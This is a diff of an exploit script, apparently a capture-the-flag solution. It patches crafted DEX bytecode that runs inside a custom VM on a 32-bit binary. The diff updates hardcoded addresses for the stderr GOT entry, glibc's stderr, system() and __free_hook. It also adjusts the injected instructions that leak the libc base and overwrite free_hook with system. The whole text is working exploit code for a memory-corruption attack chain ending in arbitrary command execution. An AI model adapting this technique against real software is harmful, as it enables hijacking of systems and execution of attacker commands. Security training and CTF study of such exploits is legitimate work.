@@ -105,10 +105,10 @@ print(dex.methods[1].code_offset)
 
 
 img_base = 0x08048000
-stderr_got = 0x0806AFE0
-stderr_glibc = 0x001B3D00 #xxxxxxF8
-system_glibc= 0x3ab40
-free_hook = 0x1B48B0
+stderr_got = 0x08069FF8
+stderr_glibc = 0x001DAE00 #xxxxxx18
+system_glibc= 0x3ec00
+free_hook = 0x001DB8D0
 
 
 # Start Patching
@@ -180,15 +180,18 @@ rawdata = patch(rawdata, pc, mul(4, 4, 17))
 pc += 4
 rawdata = patch(rawdata, pc, add(3, 4, 3))
 pc += 4
-rawdata = patch(rawdata, pc, newint(4, 0xb8))   # append last byte - string base offset
+rawdata = patch(rawdata, pc, newint(4, 0x30))   # append last byte - string base offset
 pc += 6
 rawdata = patch(rawdata, pc, add(3, 4, 3))      # v3: string base addr4ess (heap)
 pc += 4
+
+# ~ 40 inst
 
 # Sub routine, ends with jump table since invoke/call is not implemented && we have max insts limit
 # inputs : v5: addr
 # outputs : v13, v14, v15
 # vars : v6, v7
+# 50 insts
 def addr2str(rawdata, pc):
     rawdata = patch(rawdata, pc, newint(13, 10)) # clear out result regs
     pc += 6
@@ -260,7 +263,7 @@ def addr2str(rawdata, pc):
 
 
 # calculate offset to stderr got
-rawdata = patch(rawdata, pc, newint(4, stderr_got+1-8))   # 2nd byte
+rawdata = patch(rawdata, pc, newint(4, stderr_got+1-0x100))   # 2nd byte
 pc += 6
 rawdata = patch(rawdata, pc, sub(5, 4, 3))
 pc += 4
@@ -271,7 +274,7 @@ rawdata = patch(rawdata, pc, iput(14, 1, 0x15))   # "39"
 pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 0x16))   # "40"
 pc += 4
-rawdata = patch(rawdata, pc, newint(4, stderr_got+2-8))   # 3nd byte
+rawdata = patch(rawdata, pc, newint(4, stderr_got+2-0x100))   # 3nd byte
 pc += 6
 rawdata = patch(rawdata, pc, sub(5, 4, 3))
 pc += 4
@@ -282,7 +285,7 @@ rawdata = patch(rawdata, pc, iput(14, 1, 0x18))   # "39"
 pc += 4
 rawdata = patch(rawdata, pc, iput(15, 1, 0x19))   # "40"
 pc += 4
-rawdata = patch(rawdata, pc, newint(4, stderr_got+3-8))   # 4nd byte
+rawdata = patch(rawdata, pc, newint(4, stderr_got+3-0x100))   # 4nd byte
 pc += 6
 rawdata = patch(rawdata, pc, sub(5, 4, 3))
 pc += 4
@@ -336,7 +339,7 @@ rawdata = patch(rawdata, pc, sub(4, 4, 22))         # libc base
 pc += 4
 rawdata = patch(rawdata, pc, newint(23, system_glibc))
 pc += 6
-rawdata = patch(rawdata, pc, newint(24, free_hook-8))
+rawdata = patch(rawdata, pc, newint(24, free_hook-0x100))
 pc += 6
 rawdata = patch(rawdata, pc, newint(25, 1))         # v25 = 1
 pc += 6
